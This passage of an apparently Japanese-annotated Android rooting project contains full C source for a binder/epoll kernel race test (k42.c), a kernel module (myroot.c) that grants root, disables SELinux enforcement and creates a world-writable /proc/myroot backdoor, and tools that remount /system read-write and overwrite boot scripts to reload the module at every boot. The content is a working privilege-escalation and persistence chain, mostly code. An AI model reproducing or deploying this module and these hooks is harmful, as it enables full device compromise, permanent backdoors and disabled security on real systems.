      {"writev pipe       usr+huge  ", pp[1], (u64)(uintptr_t)pg, (size_t)-1, 0},
      {"writev pipe       usr+4095  ", pp[1], (u64)(uintptr_t)pg, 4095, 0},
    };
    int n = (int)(sizeof T / sizeof T[0]);
    for (int i = 0; i < n; i++){
        ssize_t r = T[i].rd ? try_readv(T[i].fd, T[i].addr, T[i].len)
                            : try_writev(T[i].fd, T[i].addr, T[i].len);
        say("%s len=0x%llx -> %zd\n", T[i].what,
            (unsigned long long)T[i].len, r);
    }

    close(pp[0]); close(pp[1]);
    if (dn >= 0) close(dn);
    if (dz >= 0) close(dz);
    say("K37 done\n");
    return 0;
}
```

（4583 バイト / 112 行 / SHA-256 `06dcdbfe860f000f464c6eec1f33fb3fa5c7d23c49b3cf0f5e77dc4db3c47717`）

### `src/tools/k42.c`

`remove_wait_queue` の spin unlock が `chunk+0x48` に `0x00010001` を書くことの数値証明。

```c
/* k42: discriminate between "iov[4].len became 65537" and "it stayed 0".
 *
 * The reason every previous run could not tell them apart is arithmetic:
 * iov_length() ignores how much data sits in the pipe. total_len is simply the
 * sum of the DECLARED iov_len values, so in k40/k41
 *
 *     total = 3*4096 + 245760 + 0 + 4096 = 262144
 *
 * and the measured r was exactly 262144 - no excess at all, and only 4096 bytes
 * were ever left for iov[4]. So a meter count of 4096 was consistent with any
 * iov[4].len >= 4096, including 0 (which would skip it entirely and give the
 * bytes to iov[5]).
 *
 * The fix is to give iov[5] a large declared length, so that after iov[3] there
 * is plenty of remaining:
 *
 *     iov[0..3]  12288 + 245760            258048 consumed first
 *     iov[4]     meter, len 0                    <- the DEL is what fills this
 *     iov[5]     sink,  len 70000           70000 remaining
 *
 *   if iov[4].len == 0        -> skipped, all 70000 go to iov[5].base
 *   if iov[4].len == 65537    -> 65537 go to iov[4].base (0x00010001, the
 *                                arm64 ticket lock after lock+unlock), 4463 to
 *                                iov[5].base
 *
 * So the meter count itself names the lock word. Both buffers are ours, both
 * are counted, and a control run with the DEL skipped is included.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/uio.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32;
typedef uint8_t u8; typedef uint16_t u16;

struct bwr_t { u64 write_size, write_consumed, write_buffer, read_size, read_consumed, read_buffer; };
struct btd_t { union { u32 handle; u64 ptr; } target; u64 cookie; u32 code; u32 flags;
               s32 sender_pid; s32 sender_euid; u64 data_size, offsets_size;
               union { struct { u64 buffer, offsets; } ptr; u8 buf[8]; } data; };
struct fbo_t { u32 type; u32 flags; union { u64 binder; u32 handle; }; u64 cookie; };

#define BINDER_WRITE_READ _IOWR('b', 1, struct bwr_t)
#define BINDER_VERSION    _IOWR('b', 9, struct { s32 protocol_version; })
#define BINDER_THREAD_EXIT _IOW('b', 8, int32_t)
#define BC_TRANSACTION _IOW('c', 0, struct btd_t)
#define BR_NOOP _IO('r', 12)
#define BR_TRANSACTION_COMPLETE _IO('r', 6)
#define BR_REPLY _IOR('r', 3, struct btd_t)
#define BR_DEAD_REPLY _IO('r', 5)
#define BR_FAILED_REPLY _IO('r', 7)
#define T_HANDLE 0x73682a85u

#define PAGE 4096
#define IOVS 32
#define BMAP_SZ (0x100000-0x2000)
#define NOISE  56
#define PRE    (3*PAGE)          /* 12288  */
#define BIGLEN (60*PAGE)         /* 245760 */
#define MTR    100               /* meter at 100..(100+MTRPAGES) */
#define MTRPAGES 40              /* 163840 bytes of measurement room */
#define SINK   160               /* iov[5].base */
#define SINKLEN 70000
#define SINKPAGES 20
#define BURST  (PRE + BIGLEN + SINKLEN)   /* 327808 written into the pipe */
#define POOLPAGES (SINK + SINKPAGES + 4)

struct shared { volatile int go, done; volatile long delok, delay, skipdel; int fd, ep, pfd; };

static u8 wbuf[8192], rbuf[8192];
static FILE *LOG;
static u8 *pool, *burst;
static struct shared *sh;
static struct iovec iovs[IOVS] __attribute__((aligned(4096)));
static int noise_fd[NOISE], nnoise;

static void say(const char *fmt, ...){
    char b[400]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int bwr_fd(int fd, size_t wl, size_t rl){
    struct bwr_t b; memset(&b,0,sizeof b);
    b.write_size = wl; b.write_buffer = (u64)(uintptr_t)wbuf;
    b.read_size  = rl; b.read_buffer  = (u64)(uintptr_t)rbuf;
    int r = ioctl(fd, BINDER_WRITE_READ, &b);
    if (r < 0) return -errno;
    return (int)b.read_consumed;
}
static u8 *p32(u8 *p, u32 v){ memcpy(p,&v,4); return p+4; }
static u8 *pstr16(u8 *p, const char *s){
    size_t n = strlen(s);
    p = p32(p, (u32)n);
    for (size_t i=0;i<n;i++){ u16 c=(u16)(unsigned char)s[i]; memcpy(p,&c,2); p+=2; }
    u16 z=0; memcpy(p,&z,2); p+=2;
    while (((uintptr_t)p) & 3) *p++ = 0;
    return p;
}
static size_t mk_svc(void){
    static u8 data[512];
    u8 *d = data;
    d = p32(d, 0);
    d = pstr16(d, "android.os.IServiceManager");
    d = pstr16(d, "activity");
    u8 *p = wbuf; u32 cmd = BC_TRANSACTION; memcpy(p,&cmd,4); p += 4;
    struct btd_t t; memset(&t,0,sizeof t);
    t.target.handle = 0; t.code = 1;
    t.data_size = (u64)(d - data); t.data.ptr.buffer = (u64)(uintptr_t)data;
    memcpy(p,&t,sizeof t); p += sizeof t;
    return (size_t)(p - wbuf);
}
static size_t mk_txn(u32 handle, u32 code){
    u8 *p = wbuf; u32 cmd = BC_TRANSACTION; memcpy(p,&cmd,4); p += 4;
    struct btd_t t; memset(&t,0,sizeof t);
    t.target.handle = handle; t.code = code;
    memcpy(p,&t,sizeof t); p += sizeof t;
    return (size_t)(p - wbuf);
}
static int get_service(int fd, u32 *handle){
    size_t wl = mk_svc();
    for (int i=0;i<200;i++){
        int n = bwr_fd(fd, i==0?wl:0, 512);
        if (n <= 0){ usleep(1200); continue; }
        u8 *q = rbuf, *end = rbuf + n;
        while (q + 4 <= end){
            u32 c; memcpy(&c,q,4); q += 4;
            if (c==BR_NOOP || c==BR_TRANSACTION_COMPLETE) continue;
            if (c==BR_REPLY){
                struct btd_t *tt = (struct btd_t*)q; q += sizeof(struct btd_t);
                if (!tt->data.ptr.buffer) continue;
                struct fbo_t *o = (struct fbo_t*)(uintptr_t)tt->data.ptr.buffer;
                if (o->type == T_HANDLE){ *handle = o->handle; return 1; }
                return 0;
            }
            if (c==BR_DEAD_REPLY || c==BR_FAILED_REPLY) return -1;
            break;
        }
    }
    return 0;
}
static void flush_fd(int fd){
    for (int i = 0; i < 64; i++){
        memset(rbuf, 0, 16);
        int n = bwr_fd(fd, 0, 512);
        if (n <= 0) break;
    }
}
static int open_conn(u32 *h){
    int fd = open("/dev/binder", O_RDONLY|O_NONBLOCK);
    if (fd < 0) return -1;
    void *bm = mmap(NULL, BMAP_SZ, PROT_READ, MAP_PRIVATE|MAP_NORESERVE, fd, 0);
    if (bm == MAP_FAILED){ close(fd); return -1; }
    ioctl(fd, BINDER_VERSION, &(s32){0});
    u32 hh = 0;
    int ok = get_service(fd, &hh) > 0;
    munmap(bm, BMAP_SZ);
    if (!ok){ close(fd); return -1; }
    *h = hh;
    return fd;
}
static int arm(int fd, u32 h, int ep, int *kind_out)
{
    flush_fd(fd);
    memset(rbuf, 0, 16);
    int n = bwr_fd(fd, mk_txn(h, 0xdead), 72);
    if (n != 8) return 0;
    if ((*(u32*)rbuf & 0xff) != 0x0c) return 0;
    if ((*(u32*)(rbuf + 4) & 0xff) != 0x06) return 0;
    struct epoll_event ev; memset(&ev,0,sizeof ev); ev.events = EPOLLIN;
    if (epoll_ctl(ep, EPOLL_CTL_ADD, fd, &ev) != 0) return 0;
    struct epoll_event o; memset(&o,0,sizeof o);
    if (epoll_wait(ep, &o, 1, 0) != 0){ *kind_out = 0; return 0; }
    memset(&o,0,sizeof o);
    if (epoll_wait(ep, &o, 1, 300) == 1){ *kind_out = 1; return 1; }
    *kind_out = 2;
    return 0;
}
static void *helper(void *a){
    (void)a;
    { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof cs,&cs); }
    for (;;){
        while (!sh->go) sched_yield();
        if (sh->delay > 0) usleep((useconds_t)sh->delay);
        if (sh->skipdel){
            sh->delok = -2;
        } else {
            struct epoll_event e2; memset(&e2,0,sizeof e2); e2.events = EPOLLIN;
            sh->delok = (epoll_ctl(sh->ep, EPOLL_CTL_DEL, sh->fd, &e2) == 0) ? 1 : 0;
        }
        { size_t off = 0;
          while (off < BURST){
              ssize_t w = write(sh->pfd, burst + off, BURST - off);
              if (w > 0){ off += (size_t)w; continue; }
              if (w < 0 && errno == EINTR) continue;
              break;
          } }
        sh->done = 1;
        while (sh->go) sched_yield();
    }
    return NULL;
}

static void run(int skipdel, const char *tag)
{
    u32 hh = 0;
    int fd = open_conn(&hh);
    if (fd < 0){ say("open_conn failed\n"); return; }
    int ep = epoll_create(1000);
    if (ep < 0){ close(fd); return; }
    int kind = -1;
    if (!arm(fd, hh, ep, &kind)){ say("%s: not armed\n", tag); close(ep); close(fd); return; }

    int pp[2]; if (pipe(pp)){ close(ep); close(fd); return; }
    fcntl(pp[1], F_SETPIPE_SZ, 1024*1024);

    memset(pool, 0x41, (size_t)POOLPAGES * PAGE);
    for (int i=0;i<3;i++){ iovs[i].iov_base = pool + (size_t)i*PAGE; iovs[i].iov_len = PAGE; }
    iovs[3].iov_base = pool + 8*PAGE;                 iovs[3].iov_len = BIGLEN;
    iovs[4].iov_base = pool + (size_t)MTR*PAGE;       iovs[4].iov_len = 0;
    iovs[5].iov_base = pool + (size_t)SINK*PAGE;      iovs[5].iov_len = SINKLEN;
    for (int i=6;i<IOVS;i++){ iovs[i].iov_base = pool + 4*PAGE; iovs[i].iov_len = 0; }

    sh->fd=fd; sh->ep=ep; sh->pfd=pp[1];
    sh->go=0; sh->done=0; sh->delok=-1; sh->delay=20; sh->skipdel=skipdel;
    s32 dummy=0;
    ioctl(fd, BINDER_THREAD_EXIT, &dummy);
    sh->go = 1;
    errno = 0;
    ssize_t r = readv(pp[0], iovs, IOVS);
    int e = errno;
    while (!sh->done) sched_yield();
    sh->go = 0;
    close(pp[0]); close(pp[1]);
    close(ep); close(fd);

    long mc = 0, sc = 0, mfirst = -1, mlast = -1;
    for (long i = 0; i < (long)MTRPAGES*PAGE; i++){
        if (pool[(size_t)MTR*PAGE + i] != 0x41){ mc++; if (mfirst<0) mfirst=i; mlast=i; }
    }
    for (long i = 0; i < (long)SINKPAGES*PAGE; i++)
        if (pool[(size_t)SINK*PAGE + i] != 0x41) sc++;

    say("%-8s kind=%d delok=%ld r=%zd e=%d  meter=%ld (span 0x%lx..0x%lx)  sink=%ld\n",
        tag, kind, sh->delok, r, e, mc,
        mfirst < 0 ? 0 : mfirst, mlast < 0 ? 0 : mlast, sc);
    say("         declared total = %d ; remaining after iov[3] = %d\n",
        PRE + BIGLEN + SINKLEN, SINKLEN);
    if (mc > 0) say("         => iov[4].len at copy time was >= %ld\n", mc);
    else        say("         => iov[4] was skipped (len was 0)\n");
}

int main(int argc, char **argv){
    int tries = (argc > 1) ? atoi(argv[1]) : 3;
    LOG = fopen("/data/local/tmp/k42.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    signal(SIGPIPE, SIG_IGN);
    { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof cs,&cs); }
    pool  = mmap(NULL, (size_t)POOLPAGES*PAGE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    burst = mmap(NULL, BURST, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    sh    = mmap(NULL, sizeof *sh, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (pool==MAP_FAILED||burst==MAP_FAILED||sh==MAP_FAILED){ say("mmap fail\n"); return 1; }
    memset(sh, 0, sizeof *sh);
    memset(burst, 0x5a, BURST);
    say("k42 pid=%d uid=%d tries=%d BURST=%d SINKLEN=%d MTRPAGES=%d\n",
        getpid(), getuid(), tries, BURST, SINKLEN, MTRPAGES);

    pthread_t th;
    if (pthread_create(&th, NULL, helper, NULL) != 0){ say("pthread fail\n"); return 1; }
    pthread_detach(th);

    nnoise = 0;
    for (int i = 0; i < NOISE; i++){
        u32 hh = 0;
        int fd = open_conn(&hh);
        if (fd < 0) break;
        bwr_fd(fd, mk_txn(hh, 0x1000 + i), 0);
        noise_fd[nnoise++] = fd;
    }
    say("  noise pool = %d\n", nnoise);

    say("--- control: DEL skipped ---\n");
    run(1, "skipdel");
    say("--- test: DEL performed ---\n");
    for (int k = 0; k < tries; k++){
        char tag[16]; snprintf(tag, sizeof tag, "k=%d", k);
        run(0, tag);
    }
    for (int i = 0; i < nnoise; i++) close(noise_fd[i]);
    say("K42 done\n");
    return 0;
}
```

（11660 バイト / 303 行 / SHA-256 `044f9fb6fc729415e7ba8ca8d1c3e865791509f36e7e21da995cc3d2d3685d21`）

## C. カーネルモジュール

### `src/module/myroot.c`

root 化モジュール。`commit_creds(prepare_kernel_cred(NULL))` + `selinux_enforcing=0` + `/proc/myroot`。

```c
/*
 * myroot.c - loadable kernel module for 3.10.33 / aarch64 (TAB-A03-BR2).
 *
 * Why a module works here when everything else was blocked:
 *
 *   - CONFIG_MODULES=y and CONFIG_MODULE_SIG is absent from .config entirely, so a
 *     module needs no signature and no key.
 *   - init_module() is gated only on may_init_module(), which tests
 *     capable(CAP_SYS_MODULE) and modules_disabled. modules_disabled is 0.
 *   - the LSM hook security_kernel_module_from_file() is not registered by SELinux in
 *     this tree. security_fixup_ops() fills it with cap_kernel_module_from_file(),
 *     which returns 0 unconditionally.
 *
 * So the only thing between uid 2000 and kernel code execution is the
 * CAP_SYS_MODULE bit in cred->cap_effective, and the ION store can set it: the stored
 * value is 0x80000000 | (k << 12), so at k = 0x7F the value 0x8007f000 carries bit
 * 16. Measured on the device with k126: k=127 gives
 * NET_ADMIN NET_RAW IPC_LOCK IPC_OWNER SYS_MODULE SYS_RAWIO SYS_CHROOT SETFCAP.
 *
 * init does three things:
 *
 *   1. commit_creds(prepare_kernel_cred(NULL)) - prepare_kernel_cred with a NULL
 *      argument starts from init_cred, which is uid 0 with CAP_FULL_SET, and
 *      commit_creds installs it on the calling task. init_module() runs in the
 *      caller's context, so that task becomes root.
 *
 *   2. selinux_enforcing = 0 - avc_denied() returns -EACCES only when
 *      selinux_enforcing is non-zero, so this makes every later SELinux check
 *      permissive without touching a single policy rule. The running shell stays in
 *      domain shell:s0; it simply stops being refused.
 *
 *   3. /proc/myroot - a world-writable file whose write handler repeats the
 *      commit_creds dance for whoever wrote to it. That is what makes the result
 *      durable: a fresh adb shell (uid 2000) becomes root by writing one byte, with
 *      no module transaction and no capability bit needed.
 *
 * All symbols are resolved through kallsyms_lookup_name(), which this kernel exports
 * (CONFIG_KALLSYMS_ALL=y), so there are no hard-coded addresses to go stale.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("research");
MODULE_DESCRIPTION("privilege transition for a test device");
MODULE_VERSION("1.0");

static void (*k_commit_creds)(struct cred *);
static struct cred *(*k_prepare_kernel_cred)(struct task_struct *);
static int *k_selinux_enforcing;

static int become_root(void)
{
	struct cred *nc;

	if (!k_commit_creds || !k_prepare_kernel_cred)
		return -ENOENT;
	nc = k_prepare_kernel_cred(NULL);
	if (!nc)
		return -ENOMEM;
	k_commit_creds(nc);
	return 0;
}

static ssize_t myroot_write(struct file *f, const char __user *ubuf,
			    size_t n, loff_t *ppos)
{
	int r = become_root();

	if (r)
		return r;
	pr_info("myroot: %s (pid %d) became uid %d euid %d\n",
		current->comm, current->pid,
		__kuid_val(current_uid()), __kuid_val(current_euid()));
	return n;
}

static const struct file_operations myroot_fops = {
	.owner = THIS_MODULE,
	.write = myroot_write,
};

static struct proc_dir_entry *myroot_entry;

static int __init myroot_init(void)
{
	k_commit_creds        = (void *)kallsyms_lookup_name("commit_creds");
	k_prepare_kernel_cred = (void *)kallsyms_lookup_name("prepare_kernel_cred");
	k_selinux_enforcing   = (int *)kallsyms_lookup_name("selinux_enforcing");

	pr_info("myroot: commit_creds=%p prepare_kernel_cred=%p selinux_enforcing=%p\n",
		k_commit_creds, k_prepare_kernel_cred, k_selinux_enforcing);

	if (become_root()) {
		pr_err("myroot: could not install init_cred\n");
		return -ENOENT;
	}

	pr_info("myroot: caller %s pid %d is now uid %d euid %d\n",
		current->comm, current->pid,
		__kuid_val(current_uid()), __kuid_val(current_euid()));
	pr_info("myroot: cap_effective=0x%08x%08x\n",
		current_cred()->cap_effective.cap[1],
		current_cred()->cap_effective.cap[0]);

	if (k_selinux_enforcing) {
		pr_info("myroot: selinux_enforcing was %d\n", *k_selinux_enforcing);
		*k_selinux_enforcing = 0;
		pr_info("myroot: selinux_enforcing is now %d\n", *k_selinux_enforcing);
	}

	myroot_entry = proc_create("myroot", 0666, NULL, &myroot_fops);
	if (!myroot_entry)
		pr_warn("myroot: /proc/myroot not created\n");
	else
		pr_info("myroot: /proc/myroot ready\n");

	return 0;
}

static void __exit myroot_exit(void)
{
	if (myroot_entry)
		remove_proc_entry("myroot", NULL);
	pr_info("myroot: unloaded\n");
}

module_init(myroot_init);
module_exit(myroot_exit);
```

（4661 バイト / 136 行 / SHA-256 `748dc2e18b84b0f63e0f53e86ef4bb0b93477d3c733427601ec523760677bb96`）

### `src/module/Makefile`

`KDIR` を受け取る out-of-tree ビルド。

```makefile
# out-of-tree build of src/module against a vendor kernel tree
#
# The kernel tree must be configured and prepared for external modules
# (`make ARCH=arm64 olddefconfig && make ARCH=arm64 modules_prepare`),
# and Module.symvers must exist for the symbols below.
#
#   KDIR  path to the kernel source tree (required)
#
# Symbols resolved at load time through kallsyms_lookup_name, so Module.symvers
# only has to contain what the compiler links: kallsyms_lookup_name, printk,
# proc_create_data, remove_proc_entry.

ifneq ($(KDIR),)
obj-m += myroot.o
PWD := $(shell pwd)
all:
	$(MAKE) -C $(KDIR) M=$(PWD) ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- modules
clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
else
all clean:
	@echo "KDIR is not set. Example:"
	@echo "  make -C src/module KDIR=\$$HOME/vendor-kernel"
	@exit 2
endif
```

（821 バイト / 25 行 / SHA-256 `07773cfa619cd36363f0f3dc34086e84f43b3d3e338cf4859632f8630de92deb`）

## D. `/system` 書き込みと永続化

### `src/tools/rw3.c`

`BLKROSET(0)` + `MS_REMOUNT` による `/system` の読み書き化の実証。

```c
/* errno 13 is EACCES, not EPERM: do_remount_sb returns -EACCES when
 * bdev_read_only(sb->s_bdev). So clear the block device's read-only flag with
 * BLKROSET(0) on the same device and retry immediately, in one process. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
static FILE *o;
static int be_root(void){int f=open("/proc/myroot",O_WRONLY);if(f<0)return -1;
 ssize_t w=write(f,"1",1);close(f);return w==1?0:-1;}
int main(void){
    o=fopen("/data/local/tmp/rw3.txt","w"); if(!o)o=stdout;
    if(be_root()!=0){fprintf(o,"no root\n");fclose(o);return 1;}
    fprintf(o,"uid=%d\n",getuid());
    const char *dev="/dev/block/platform/soc.1/by-name/system";
    int b=open(dev,O_RDWR);
    if(b<0){ fprintf(o,"open %s: %s\n",dev,strerror(errno)); fclose(o); return 1; }
    int ro=-1;
    ioctl(b,BLKROGET,&ro); fprintf(o,"BLKROGET before = %d\n",ro);
    int z=0;
    int rr=ioctl(b,BLKROSET,&z);
    fprintf(o,"BLKROSET(0) = %d errno=%d (%s)\n",rr,errno,strerror(errno));
    ioctl(b,BLKROGET,&ro); fprintf(o,"BLKROGET after  = %d\n",ro);
    /* keep b open: the flag lives on this bdev */
    errno=0;
    int r=mount(NULL,"/system",NULL,MS_REMOUNT,NULL);
    fprintf(o,"mount(REMOUNT) = %d errno=%d (%s)\n",r,errno,strerror(errno));
    if(r){
        errno=0;
        r=mount("none","/system",NULL,MS_REMOUNT,NULL);
        fprintf(o,"mount(none,REMOUNT) = %d errno=%d (%s)\n",r,errno,strerror(errno));
    }
    if(r==0){
        int f=open("/system/.k3",O_CREAT|O_WRONLY,0644);
        fprintf(o,"write /system/.k3 = %s\n",f>=0?"OK":strerror(errno));
        if(f>=0){write(f,"x",1);close(f);}
    }
    close(b);
    fclose(o); return 0;
}
```

（1831 バイト / 47 行 / SHA-256 `5d260bf9fac8174d53e6658c8f4af6a03e8b2fe3f429e5f919f0b30047034c74`）

### `src/tools/hook5.c`

`calibinit.sh`（init ドメイン）への起動フック設置。

```c
/* Every service without a seclabel line runs in the init domain, and the domain is
 * chosen by the FILE's label, not by the service. kinitlog.sh ran as kinitlog:s0
 * because /system/bin/kinitlog.sh carries u:object_r:kinitlog_exec:s0. calibinit.sh
 * has no file_contexts entry at all, so it stays in the init domain, which is the
 * domain that can load modules and write /sys.
 *
 *     service calibinit /system/bin/calibinit.sh
 *         class main
 *         oneshot
 *
 * class main + no disabled => started at boot, as root, in init's own domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
static FILE *o;
static int be_root(void){int f=open("/proc/myroot",O_WRONLY);if(f<0)return -1;
 ssize_t w=write(f,"1",1);close(f);return w==1?0:-1;}
int main(void){
    o=fopen("/data/local/tmp/hook5.txt","w"); if(!o)o=stdout;
    if(be_root()!=0){fprintf(o,"no root\n");fclose(o);return 1;}
    int b=open("/dev/block/platform/soc.1/by-name/system",O_RDWR);
    if(b<0){fprintf(o,"open: %s\n",strerror(errno));fclose(o);return 1;}
    ioctl(b,BLKROSET,&(int){0});
    if(mount(NULL,"/system",NULL,MS_REMOUNT,NULL)!=0){
        fprintf(o,"remount: %s\n",strerror(errno));close(b);fclose(o);return 1;}
    fprintf(o,"/system rw\n");

    /* keep the original */
    { int in=open("/system/bin/calibinit.sh",O_RDONLY);
      if(in>=0){ char buf[4096]; ssize_t n=read(in,buf,sizeof buf);
        if(n>0){ int out=open("/system/lib/modules/calibinit.sh.orig",O_CREAT|O_TRUNC|O_WRONLY,0644);
                 if(out>=0){ write(out,buf,n); close(out); } }
        close(in);
        fprintf(o,"  original saved\n"); } }

    /* the payload: drop enforcing, then load the module with the static loader */
    const char *sh =
        "#!/system/bin/sh\n"
        "echo 0 > /sys/fs/selinux/enforce\n"
        "/system/lib/modules/rootload /system/lib/modules/myroot.ko\n"
        "echo 1 > /proc/myroot\n"
        "exit 0\n";
    int f=open("/system/bin/calibinit.sh",O_CREAT|O_TRUNC|O_WRONLY,0755);
    if(f<0) fprintf(o,"  write: %s\n",strerror(errno));
    else { write(f,sh,strlen(sh)); close(f); chmod("/system/bin/calibinit.sh",0755);
           fprintf(o,"  wrote calibinit.sh (%zu bytes)\n",strlen(sh)); }
    struct stat st;
    if(stat("/system/bin/calibinit.sh",&st)==0)
        fprintf(o,"  verify %lld bytes\n",(long long)st.st_size);
    sync();
    ioctl(b,BLKROSET,&(int){1});
    mount(NULL,"/system",NULL,MS_REMOUNT|MS_RDONLY,NULL);
    fprintf(o,"/system ro\n");
    close(b); fclose(o); return 0;
}
```

（2700 バイト / 64 行 / SHA-256 `1734f9b42a9dd22a3bad22bfd690c15a8a1dd6de86c7558abf4d66596851d912`）

### `src/tools/install_hook.c`

静的ローダを使ったフック設置の別実装。

```c
/* Install the boot hook with a static loader, because insmod is a symlink to the
 * broken toolbox binary. Two files change on /system:
 *   /system/lib/modules/myroot.ko     the module
 *   /system/bin/kinitlog.sh           the script init runs at boot_completed
 * and the directory also gets /system/lib/modules/rootload, the static loader. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
static FILE *o;
static int be_root(void){int f=open("/proc/myroot",O_WRONLY);if(f<0)return -1;
 ssize_t w=write(f,"1",1);close(f);return w==1?0:-1;}
static int cp(const char *s,const char *d,mode_t m){
    int in=open(s,O_RDONLY);
    if(in<0){fprintf(o,"  %s: %s\n",s,strerror(errno));return -1;}
    int out=open(d,O_CREAT|O_TRUNC|O_WRONLY,m);
    if(out<0){fprintf(o,"  %s: %s\n",d,strerror(errno));close(in);return -1;}
    char b[65536]; ssize_t n; long t=0;
    while((n=read(in,b,sizeof b))>0){ ssize_t off=0;
        while(off<n){ ssize_t w=write(out,b+off,n-off); if(w<=0)break; off+=w;} t+=n; }
    close(in); close(out); chmod(d,m);
    fprintf(o,"  %s -> %s (%ld bytes mode %o)\n",s,d,t,m&07777);
    return 0;
}
int main(void){
    o=fopen("/data/local/tmp/install_hook.txt","w"); if(!o)o=stdout;
    if(be_root()!=0){fprintf(o,"no root\n");fclose(o);return 1;}
    fprintf(o,"uid=%d\n",getuid());
    int b=open("/dev/block/platform/soc.1/by-name/system",O_RDWR);
    if(b<0){fprintf(o,"open: %s\n",strerror(errno));fclose(o);return 1;}
    ioctl(b,BLKROSET,&(int){0});
    if(mount(NULL,"/system",NULL,MS_REMOUNT,NULL)!=0){
        fprintf(o,"remount: %s\n",strerror(errno));close(b);fclose(o);return 1;}
    fprintf(o,"/system rw\n");

    cp("/data/local/tmp/myroot.ko","/system/lib/modules/myroot.ko",0644);
    cp("/data/local/tmp/modload","/system/lib/modules/rootload",0750);

    /* the hook calls the static loader, not insmod */
    const char *sh =
        "#!/system/bin/sh\n"
        "/system/lib/modules/rootload /system/lib/modules/myroot.ko\n"
        "exit 0\n";
    { int f=open("/system/bin/kinitlog.sh",O_CREAT|O_TRUNC|O_WRONLY,0755);
      if(f<0) fprintf(o,"  kinitlog.sh: %s\n",strerror(errno));
      else { write(f,sh,strlen(sh)); close(f); chmod("/system/bin/kinitlog.sh",0755);
             fprintf(o,"  wrote /system/bin/kinitlog.sh (%zu bytes)\n",strlen(sh)); } }

    struct stat st;
    const char *c[]={"/system/lib/modules/myroot.ko","/system/lib/modules/rootload",
                     "/system/bin/kinitlog.sh",NULL};
    for(int i=0;c[i];i++){
        if(stat(c[i],&st)==0) fprintf(o,"  %-40s %lld bytes mode=%o\n",
                                      c[i],(long long)st.st_size,st.st_mode&07777);
        else fprintf(o,"  %-40s %s\n",c[i],strerror(errno));
    }
    sync();
    ioctl(b,BLKROSET,&(int){1});
    mount(NULL,"/system",NULL,MS_REMOUNT|MS_RDONLY,NULL);
    fprintf(o,"/system ro\n");
    close(b); fclose(o);
    return 0;
}
```

（3067 バイト / 70 行 / SHA-256 `d9c05f19c118b14fd9db1da912e6f87f6c75760f19e31c0b3e48dcb435278bdd`）

### `src/tools/recov.c`

recovery / misc による復旧経路の検証。

```c
/* Before touching flash, establish that recovery is reachable. Two things decide it:
 * the misc partition's bootloader message (which tells init to enter recovery) and
 * whether the bootloader honours it. So: inspect misc, then read it back unchanged. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
static FILE *o;
static int be_root(void){int f=open("/proc/myroot",O_WRONLY);if(f<0)return -1;
 ssize_t w=write(f,"1",1);close(f);return w==1?0:-1;}
struct bootloader_message {
    char command[32];
    char status[32];
    char recovery[768];
    char stage[32];
    char reserved[1184];
};
int main(void){
    o=fopen("/data/local/tmp/recov.txt","w"); if(!o)o=stdout;
    if(be_root()!=0){fprintf(o,"no root\n");fclose(o);return 1;}
    fprintf(o,"uid=%d\n",getuid());
    const char *misc="/dev/block/platform/soc.1/by-name/misc";
    fprintf(o,"=== misc (%s) ===\n", misc);
    int f=open(misc,O_RDWR);
    if(f<0){fprintf(o,"open: %s\n",strerror(errno));fclose(o);return 1;}
    struct bootloader_message bm;
    memset(&bm,0,sizeof bm);
    ssize_t n=pread(f,&bm,sizeof bm,0);
    fprintf(o,"read %zd bytes\n",n);
    fprintf(o,"  command  = [%.32s]\n", bm.command);
    fprintf(o,"  status   = [%.32s]\n", bm.status);
    fprintf(o,"  recovery = [%.64s]\n", bm.recovery);
    fprintf(o,"  stage    = [%.32s]\n", bm.stage);

    fprintf(o,"=== recovery partition ===\n");
    int r=open("/dev/block/platform/soc.1/by-name/recovery",O_RDONLY);
    if(r>=0){
        unsigned char h[64]; ssize_t hn=pread(r,h,64,0);
        fprintf(o,"  %zd bytes read; magic=", hn);
        for(int i=0;i<8&&i<hn;i++) fprintf(o,"%02x",h[i]);
        fprintf(o," ascii=");
        for(int i=0;i<8&&i<hn;i++) fprintf(o,"%c",(h[i]>=32&&h[i]<127)?h[i]:'.');
        fprintf(o,"\n");
        unsigned int ks=0,rs=0;
        if(hn>=20){ memcpy(&ks,h+8,4); memcpy(&rs,h+16,4); }
